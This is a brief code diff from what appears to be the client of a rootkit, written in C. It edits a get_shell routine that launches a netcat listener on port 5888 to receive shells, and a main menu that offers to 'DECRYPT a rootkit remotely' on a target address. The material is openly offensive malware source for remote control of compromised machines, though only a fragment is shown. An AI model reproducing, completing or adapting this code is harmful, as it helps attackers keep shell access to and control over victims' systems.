@@ -107,7 +107,7 @@ void get_shell(char* argv){
     }else {
         //Activating listener
         char *cmd = "nc";
-        char *argv[3];
+        char *argv[4];
         argv[0] = "nc";
         argv[1] = "-lvp";
         argv[2] = "5888";
@@ -289,7 +289,7 @@ void main(int argc, char* argv[]){
         printf("["KBLU"INFO"RESET"]""Selected DECRYPT a rootkit remotely\n");
         decrypt_directory(dest_address, path_arg);
     }else{
-        print_help_dialog(argv[0]);
+        //print_help_dialog(argv[0]);
         exit(EXIT_FAILURE);
     }
    
